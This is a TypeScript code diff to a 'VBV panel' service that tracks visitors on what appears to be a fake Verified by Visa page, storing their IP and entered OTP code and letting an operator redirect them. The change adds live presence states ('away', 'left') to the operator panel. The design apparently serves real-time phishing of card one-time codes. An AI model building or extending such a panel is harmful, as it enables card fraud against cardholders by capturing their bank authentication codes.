@@ -20,13 +20,17 @@ interface VBVClient {
   otpCode?: string;
   lastActivity: number;
   isOnline: boolean;
+  /** true = onglet pas focus (autre onglet ou fenêtre minimisée) → afficher "Client parti" */
+  isAway: boolean;
+  /** true = page fermée (leave appelé) → afficher "Client parti" définitivement */
+  left: boolean;
 }
 
 class VBVPanelService {
   private clients = new Map<string, VBVClient>();
   private redirectRequests = new Map<string, string>(); // visitId -> redirectTo
   private readonly HEARTBEAT_TIMEOUT = 120000; // 2 min sans heartbeat = hors ligne (client envoie toutes les 5s)
-  // Le client n'est retiré que lorsqu'il ferme la fenêtre (appel à removeClient via /api/vbv-panel/leave)
+  // left=true quand le client ferme la page (leave). isAway=true quand l'onglet n'est pas focus.
 
   /**
    * Enregistre ou met à jour un client sur la page VBV
@@ -74,6 +78,8 @@ class VBVPanelService {
       otpCode: data.otpCode !== undefined ? data.otpCode : existing?.otpCode,
       lastActivity: now,
       isOnline: true,
+      isAway: existing?.isAway ?? false,
+      left: existing?.left ?? false,
     };
 
     this.clients.set(data.visitId, client);
@@ -82,13 +88,12 @@ class VBVPanelService {
   }
 
   /**
-   * Met à jour le heartbeat d'un client
-   * Si le client n'existe pas encore, le crée avec des données minimales
+   * Met à jour le heartbeat d'un client.
+   * focused = true si l'onglet est visible, false si autre onglet / fenêtre non focus.
    */
-  updateHeartbeat(visitId: string, ip?: string): boolean {
+  updateHeartbeat(visitId: string, ip?: string, focused?: boolean): boolean {
     let client = this.clients.get(visitId);
-    
-    // Si le client n'existe pas encore, le créer avec des données minimales
+
     if (!client && ip) {
       client = {
         visitId,
@@ -103,18 +108,22 @@ class VBVPanelService {
         },
         lastActivity: Date.now(),
         isOnline: true,
+        isAway: false,
+        left: false,
       };
       this.clients.set(visitId, client);
       console.log(`[VBV Service] Client created via heartbeat: ${visitId.substring(0, 12)}... (Total clients: ${this.clients.size})`);
       return true;
     }
-    
-    if (!client) {
-      return false;
-    }
+
+    if (!client) return false;
+    if (client.left) return true; // déjà marqué parti, on accepte le heartbeat sans rien faire
 
     client.lastActivity = Date.now();
     client.isOnline = true;
+    if (focused !== undefined) {
+      client.isAway = !focused;
+    }
     return true;
   }
 
@@ -125,8 +134,8 @@ class VBVPanelService {
   getAllClients(): VBVClient[] {
     const now = Date.now();
 
-    // Mettre à jour uniquement le statut en ligne (sans retirer les clients)
     for (const client of Array.from(this.clients.values())) {
+      if (client.left) continue;
       const timeSinceLastActivity = now - client.lastActivity;
       client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
     }
@@ -145,7 +154,7 @@ class VBVPanelService {
    */
   getClient(visitId: string): VBVClient | undefined {
     const client = this.clients.get(visitId);
-    if (client) {
+    if (client && !client.left) {
       const now = Date.now();
       const timeSinceLastActivity = now - client.lastActivity;
       client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
@@ -154,7 +163,19 @@ class VBVPanelService {
   }
 
   /**
-   * Supprime un client (quand il quitte la page)
+   * Marque un client comme parti (page fermée). Il reste dans la liste avec "Client parti".
+   */
+  markClientLeft(visitId: string): boolean {
+    const client = this.clients.get(visitId);
+    if (!client) return false;
+    client.left = true;
+    client.isOnline = false;
+    client.isAway = true;
+    return true;
+  }
+
+  /**
+   * Supprime un client de la map (pour nettoyage optionnel)
    */
   removeClient(visitId: string): boolean {
     return this.clients.delete(visitId);
